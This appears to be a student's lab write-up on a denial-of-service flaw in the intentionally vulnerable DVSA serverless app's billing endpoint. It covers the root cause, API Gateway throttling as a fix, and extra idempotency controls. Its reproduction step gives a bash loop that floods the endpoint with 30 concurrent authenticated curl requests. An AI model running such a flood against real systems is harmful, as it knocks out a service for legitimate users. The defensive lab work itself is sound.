# Lesson 6 — Denial of Service (No Rate Limiting)

**Student:** Khalid Aljohani  
**Vulnerability class:** Denial of Service  
**Affected component:** `DVSA-BILLING` Lambda via API Gateway  
**Endpoint:** `POST /dvsa/order` with `action:"billing"`

---

## Summary

The billing endpoint has no rate limiting or concurrency control. Sending 30 simultaneous
billing requests causes the backend Lambda to become overloaded and return repeated HTTP
500 and 502 errors, preventing legitimate users from completing payments.

**Impact:** Any authenticated user can disrupt the billing workflow for all other users.

---

## Root Cause

API Gateway is deployed with no throttling settings. The Lambda processes all incoming
requests simultaneously without any per-user or per-order rate limiting or idempotency checks.

---

## Reproduction Steps

### Step 1 — Place a real order and reach the billing step

Log in to DVSA, add an item to the cart, and proceed to checkout. Do **not** click Pay yet.

### Step 2 — Capture the billing request

Open **DevTools → Network tab** and click **Pay**. Copy the POST request with
`"action":"billing"` as a `curl` command.

```bash
export API="https://<id>.execute-api.us-east-1.amazonaws.com/dvsa/order"
export TOKEN="<your-cognito-jwt>"
export ORDER_ID="<your-order-id>"
```

### Step 3 — Fire 30 concurrent billing requests

```bash
bash exploit/dos_attack.sh
```

Or manually:
```bash
for i in {1..30}; do
  curl -s "$API" \
    -H "authorization: $TOKEN" \
    -H "content-type: application/json" \
    --data-raw "{\"action\":\"billing\",\"order-id\":\"$ORDER_ID\",\"data\":{\"ccn\":\"4574487405351567\",\"exp\":\"08/28\",\"cvv\":\"973\"}}" &
done
wait
```

### Step 4 — Observe the results

Multiple `Internal server error` responses in the terminal confirm the backend is overwhelmed.

---

## Evidence

Screenshots to place in `screenshots/`:
- `6.1-normal-billing-request.png` — single billing request captured in DevTools
- `6.2-dos-terminal-output.png` — terminal showing multiple 500/502 responses
- `6.3-api-gateway-throttling-config.png` — throttling settings applied as fix

---

## Fix

**Resource:** API Gateway Stage — `dvsa` → Method Throttling

Configure throttling on the billing route:

| Setting | Value |
|---------|-------|
| Rate limit | 5 requests/second |
| Burst limit | 10 requests |

See [`fix/throttling-config.md`](fix/throttling-config.md) for step-by-step instructions.

**Additional recommended controls:**
- Backend duplicate-billing prevention (DynamoDB idempotency key)
- Per-user rate limiting at the Lambda level
- SQS queue for billing requests (decouples traffic spikes)

### Note on effectiveness

After applying API Gateway throttling, the concurrent test was repeated. The system
continued to return some 500/502 responses, indicating that throttling alone was not fully
effective. Additional backend controls (e.g., DynamoDB conditional writes, as implemented in
Lesson 8) are required for full protection.

---

## Takeaway

Serverless applications still need strong availability controls. AWS Lambda scales automatically
but that scaling is limited by concurrency quotas, DynamoDB capacity, and downstream
dependencies. Rate limiting and idempotency must be enforced explicitly — they are not
provided automatically.
